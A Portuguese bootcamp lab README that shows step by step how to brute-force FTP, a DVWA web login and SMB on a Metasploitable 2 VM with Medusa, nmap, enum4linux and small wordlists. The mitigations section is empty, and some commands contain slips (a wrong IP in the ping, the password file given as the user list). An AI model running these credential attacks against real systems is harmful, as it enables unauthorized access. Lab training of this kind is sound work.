# :round_pushpin: Simulando um Ataque de Brute Force de Senhas com Medusa e Kali Linux

Um projeto do bootcamp **Riachuelo Cibersegurança** na plataforma de ensino **DIO**.
1. ![Força bruta em FTP](https://github.com/flanubit/DIO-brute-force-com-medusa-na-vm-metasploitable-2/tree/main?tab=readme-ov-file#computer-for%C3%A7a-bruta-em-ftp)
2. ![Automação de tentativas em formulário Web](https://github.com/flanubit/DIO-brute-force-com-medusa-na-vm-metasploitable-2/tree/main?tab=readme-ov-file#computer-automa%C3%A7%C3%A3o-de-tentativas-em-formul%C3%A1rio-web)
3. ![Password Spraying em SMB](https://github.com/flanubit/DIO-brute-force-com-medusa-na-vm-metasploitable-2/tree/main?tab=readme-ov-file#computer-password-spraying-em-smb)
4. ![Mitigações](

---
## :computer: Força bruta em FTP

Use **"msfadmin"** como usuário e senha na vm Metasploitable 2:

![](https://github.com/flanubit/brute-force-com-medusa-na-vm-metasploitable-2-DIO/blob/main/images/Captura%20de%20tela%202026-03-05%20215519.png)

Confira o o IP da máquina Metasploitable 2 usando o comando:
~~~bash
ip addr
~~~
Neste caso o ip é **192.168.56.102**:

![](https://github.com/flanubit/brute-force-com-medusa-na-vm-metasploitable-2-DIO/blob/main/images/Captura%20de%20tela%202026-03-05%20215619.png)

Abra a outra vm com o Kali Linux instalado, e seguida use o comando
~~~bash
ping -c 3 198.168.56.102
~~~
Enviando 3 pacotes ping e testar conexão com a vm Metasploitable 2:

![](https://github.com/flanubit/brute-force-com-medusa-na-vm-metasploitable-2-DIO/blob/main/images/Screenshot_2026-03-05_19-57-08.png)

Após o **ping** use o comando:
~~~bash
nmap -sV -p 21,22,80,445,139 192.168.56.102
~~~
Este comando procura pelas portas informadas com o parâmetro **-p**, verifica se estão abertas e qual versão do serviço estão executando nelas com o parâmetro **-sV**:

![](https://github.com/flanubit/brute-force-com-medusa-na-vm-metasploitable-2-DIO/blob/main/images/Screenshot_2026-03-05_20-01-11.png)

Agora tente se conectar ao serviço **FTP** na vm Metasploitable 2 usando o comando:
~~~bash
ftp 192.168.56.102
~~~
Você verá uma tela semelhante a essa abaixo se houver conexão, porém ainda não sabemos o usuário e senha para acessar:

![](https://github.com/flanubit/brute-force-com-medusa-na-vm-metasploitable-2-DIO/blob/main/images/Screenshot_2026-03-05_20-04-09.png)

Vamos usar um ataque com dicionário contra o protocolo FTP criando nossa lista de palavras com os comandos abaixo:
~~~bash
echo -e "user\nmsfadmin\nadmin\nroot" > usuarios.txt
echo -e "123456\npassword\nqwerty\nmsfadmin" > senhas.txt
~~~

![](https://github.com/flanubit/DIO-brute-force-com-medusa-na-vm-metasploitable-2/blob/main/images/Screenshot_2026-03-05_20-09-50.png)

Usando o Medusa para um ataque de força bruta com a lista de senhas e usuario que criamos, comando abaixo:
~~~bash
medusa -h 192.168.56.102 -U usuarios.txt -P senhas.txt -M ftp -t 6 | grep 'SUCCESS'
~~~
Que nos retornará com o usuário e senha que obeteve sucesso de login. Tente novamente a conexão FTP e use as credenciais encontradas:

![](https://github.com/flanubit/DIO-brute-force-com-medusa-na-vm-metasploitable-2/blob/main/images/Screenshot_2026-03-05_20-23-29.png)

---
## :computer: Automação de tentativas em formulário Web

Abra o navegador e digite o ip na vm Metasploitable 2, e seguida navegue até o item DVWA:

![](https://github.com/flanubit/DIO-brute-force-com-medusa-na-vm-metasploitable-2/blob/main/images/Screenshot_2026-03-06_07-53-43.png)

Você verá uma tela de login como esta abaixo:

![](https://github.com/flanubit/DIO-brute-force-com-medusa-na-vm-metasploitable-2/blob/main/images/Screenshot_2026-03-06_12-12-45.png)

Em seguida abra o modo de inspeção de código no navegador *(firefox neste o atalho é CTRL+SHIFT+E)* e entre com **"teste"** no campo de usuário e senha para testar o formulário de login e extrair os parâmetros usado no processo:

![](https://github.com/flanubit/DIO-brute-force-com-medusa-na-vm-metasploitable-2/blob/main/images/Screenshot_2026-03-06_12-14-41.png)

No nosso canto inferior esquerdo veremos os parâmetros que foram usados na tentativa de login. Informação importante que usaremos na sequência:

![](https://github.com/flanubit/DIO-brute-force-com-medusa-na-vm-metasploitable-2/blob/main/images/Screenshot_2026-03-06_12-15-51.png)

Agora faremos nosso novo dicionário de palavras para ser usado no ataque com dicionário, use os comandos:
~~~bash
echo -e "user\nmsfadmin\nadmin\nroot" > usuarios_web.txt
echo -e "123456\npassword\nqwerty\nmsfadmin" > senhas_web.txt
~~~

![](https://github.com/flanubit/DIO-brute-force-com-medusa-na-vm-metasploitable-2/blob/main/images/Screenshot_2026-03-06_12-22-14.png)

Usando o Medusa novamente para fazer o ataque de força bruta, use o seguinte comando:
~~~bash
medusa -h 192.168.56.102 -U usuarios_web.txt -P senhas_web.txt -M http \ -m PAGE: '/dvwa/login.php' \ -m FORM: 'username=^USER^&password=^PASS^&Login=Login' \ -m 'FAIL=Login failed' -t 6 | grep 'SUCCESS'
~~~
Você verá um resultado como o da tela abaixo:

![](https://github.com/flanubit/DIO-brute-force-com-medusa-na-vm-metasploitable-2/blob/main/images/Screenshot_2026-03-06_12-44-06.png)

Agora use as credencias encontradas e tente logar novamente. Se o login for bem sucedido você verá uma tela semelhante a essa:

![](https://github.com/flanubit/DIO-brute-force-com-medusa-na-vm-metasploitable-2/blob/main/images/Screenshot_2026-03-06_12-45-51.png)

Tudo certo, você conseguiu acesso ao sistema web.

---
## :computer: Password Spraying em SMB

Vamos começar fazendo a enumeração dos serviços na vm Metasploitable 2 e extrair os usuários do serviço **SBM**, com os seguintes comandos:
~~~bash
enum4linux -a 192.168.56.102 | tee enum4_saida.txt
cat enum4_saida.txt | grep 'user:'
~~~

![](https://github.com/flanubit/DIO-brute-force-com-medusa-na-vm-metasploitable-2/blob/main/images/Screenshot_2026-03-06_14-37-32.png)
![](https://github.com/flanubit/DIO-brute-force-com-medusa-na-vm-metasploitable-2/blob/main/images/Screenshot_2026-03-06_14-39-58.png)

Em seguida criaremos novos dicionários para o ataque de força bruta com o Medusa, comandos abaixo:
~~~bash
echo -e "user\nmsfadmin\nservice" > usuarios_smb.txt
echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_smb.txt
~~~

![](https://github.com/flanubit/DIO-brute-force-com-medusa-na-vm-metasploitable-2/blob/main/images/Screenshot_2026-03-06_14-44-22.png)

Por último vamos executar o ataque com o Medusa e usar a credencial encontrada para testar o acesso ao serviço **SMB**, comandos abaixo:
~~~bash
medusa -h 192.168.56.102 -U senhas_smb.txt -P senhas_smb.txt -M smbnt -t 2 -T 50 | grep 'ACCOUNT FOUND'
smbclient -L //192.168.56.102 -U msfadmin
~~~

![](https://github.com/flanubit/DIO-brute-force-com-medusa-na-vm-metasploitable-2/blob/main/images/Screenshot_2026-03-06_14-55-33.png)

Se o login for bem sucedido você verá um resultador similar a tela acima, tudo ok, deu certo!

---
## :white_check_mark: Mitigações
